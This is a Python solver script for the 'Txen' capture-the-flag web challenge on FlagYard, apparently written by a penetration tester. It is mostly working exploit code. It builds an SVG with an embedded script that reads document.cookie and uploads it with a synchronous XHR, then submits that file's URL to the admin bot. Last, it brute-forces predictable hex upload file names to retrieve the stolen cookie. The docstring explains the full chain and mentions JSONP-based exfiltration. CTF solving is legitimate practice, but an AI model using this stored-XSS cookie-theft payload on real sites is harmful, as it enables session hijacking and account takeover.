#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TXEN  -  FlagYard Web solver

Txen (FlagYard Training Labs, Medium / SAFCSP) is a Next.js "file sharing"
service. Route map (confirmed live):

    POST /api/upload    multipart "file" (extension-checked, .svg/.gif/... ok)
                        -> {"filePath":"public/uploads/<hexname>.<ext>"}
    POST /api/report    {"url":"http://localhost:5000/..."} -> admin bot visits
    GET  /uploads/<hexname>.<ext>   requires Sec-Fetch headers (else 307 -> /403)

Admin bot:
    * only visits localhost URLs ("Only localhost URLs are allowed")
    * has NO outbound internet: any external network request in the visited
      page makes /api/report crash with 500 (tested: image/fetch/JSONP hosts
      all -> 500). Therefore the classic Mixpanel JSONP + external receiver
      tricks fail on this instance; exfiltration must go THROUGH the app.

The chain (works because the SVG is same-origin when the bot visits it):

    1) Upload an SVG whose <script> uses a SYNCHRONOUS XMLHttpRequest to POST
       document.cookie back to /api/upload as a .svg file. (Async fetch gets
       killed when the bot tears the page down - sync XHR is the reliable one.)
    2) Report http://localhost:5000/uploads/<payload>.svg to the bot.
    3) The bot executes the script, the server stores our payload bytes as a
       NEW file -- with a predictably incremental hex file name.
    4) Upload-file names look like "<instanceprefix><hexcounter>.<ext>": the
       whole name (minus extension) is a hex integer that grows by +1 per
       upload, so we can brute-list the few names after our marker and read
       the cookie file content -> "FLAG=FlagY{...}".

Verified live: script recovered `FlagY{acfc0e3c47b8975f006174cd5b1da1b4}` and
writes `flag_from_txen.txt`.
"""
from __future__ import annotations

import http.client
import io
import json
import random
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("T X E N   S O L V E R",
              "svg script -> sync XHR cookie upload -> predictable file name"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Txen challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url

def upload(host, content, fname="s.svg", tries=8):
    """POST a file to /api/upload; return the full server 'filePath'."""
    last = None
    for _ in range(tries):
        try:
            boundary = "----Bnd%d" % random.randint(10 ** 9, 10 ** 10 - 1)
            body = io.BytesIO()
            body.write(("--%s\r\n" % boundary).encode())
            body.write(('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % fname).encode())
            body.write(b"Content-Type: image/svg+xml\r\n\r\n")
            body.write(content)
            body.write(("\r\n--%s--\r\n" % boundary).encode())
            c = http.client.HTTPConnection(host, 80, timeout=40)
            c.request("POST", "/api/upload", body=body.getvalue(),
                      headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
            r = c.getresponse()
            d = r.read()
            c.close()
            if r.status != 200:
                last = "HTTP %d %s" % (r.status, d[:120])
                time.sleep(6)
                continue
            j = json.loads(d.decode("utf-8", "replace"))
            return j["filePath"]
        except Exception as e:
            last = str(e)
            time.sleep(6)
    raise RuntimeError("upload failed: %s" % last)

def report(host, url, tries=5):
    for _ in range(tries):
        try:
            c = http.client.HTTPConnection(host, 80, timeout=90)
            c.request("POST", "/api/report",
                      body=json.dumps({"url": url}).encode(),
                      headers={"Content-Type": "application/json"})
            r = c.getresponse()
            d = r.read()
            c.close()
            if r.status == 200:
                return True
            time.sleep(8)
        except Exception:
            time.sleep(8)
    return False

def getfile(host, path, tries=4):
    """GET an upload; the app only serves it with Sec-Fetch headers."""
    for _ in range(tries):
        try:
            c = http.client.HTTPConnection(host, 80, timeout=20)
            c.request("GET", path, headers={"Sec-Fetch-Dest": "document",
                                            "Sec-Fetch-Mode": "navigate",
                                            "Sec-Fetch-Site": "same-origin"})
            r = c.getresponse()
            d = r.read()
            c.close()
            if r.status == 200:
                return d
            return b""
        except Exception:
            time.sleep(5)
    return b""

def hexname(fp):
    """'public/uploads/abc50f.svg' -> integer value of 'abc50f'."""
    n = fp.split("/")[-1].rsplit(".", 1)[0]
    return int(n, 16)

def cand_name(fp, delta):
    """filename whose whole hex value differs by `delta` from fp's."""
    val = hexname(fp) + delta
    return format(val, "x") + "." + fp.split("/")[-1].rsplit(".", 1)[1]

def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    step("target host %s" % host)

    # ---- craft the cookie-stealing SVG (sync XHR, no external network) ----
    script = ("var d=document.cookie;"
              "var fd=new FormData();"
              "fd.append('file',new Blob([d],{type:'image/svg+xml'}),'steal.svg');"
              "var x=new XMLHttpRequest();x.open('POST','/api/upload',false);x.send(fd);")
    svg = ("<svg xmlns=\"http://www.w3.org/2000/svg\"><script>%s</script></svg>" % script).encode()
    ok("cookie-exfil SVG crafted (sync XHR to /api/upload, no internet needed)")

    payload_fp = upload(host, svg, "p.svg")
    ok("uploaded payload -> %s" % payload_fp.split("/")[-1])

    bot_url = "http://localhost:5000/uploads/" + payload_fp.split("/")[-1]
    step("reporting %s to the admin bot" % bot_url)
    if not report(host, bot_url):
        fail("report kept failing; the bot service may be busy - rerun in a few sec")
        return
    ok("URL submitted successfully")

    # ---- one single moving progress line: wait for bot -> scan names ----
    t_wait = time.time()
    while time.time() - t_wait < 11.0:
        tick(0.60 + 0.05 * (time.time() - t_wait) / 11.0,
             "waiting for the bot's cookie upload")
        time.sleep(0.2)

    base = hexname(payload_fp)
    tick(0.74, "scanning predictable hex file names (base+1 .. base+8)")
    flag = ""
    for delta in range(1, 9):
        tick(0.74 + 0.02 * delta, "scanning /uploads/%s" % cand_name(payload_fp, delta))
        cname = cand_name(payload_fp, delta)
        d = getfile(host, "/uploads/" + cname)
        if not d:
            continue
        m = re.search(rb"FLAG\s*=\s*(FlagY\{[^}]+\})", d, re.I) or \
            re.search(rb"(FlagY\{[^}]+\})", d)
        if m:
            flag = m.group(1).decode("utf-8", "replace")
            print()
            ok("cookie file found at /uploads/%s" % cname)
            break
    if not flag:
        print()
        fail("scanned window showed no cookie file yet (bot busy / instance respawned)")
        fail("re-run the solver once; it uses fresh upload names each time")
        return

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_txen.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))

if __name__ == "__main__":
    main()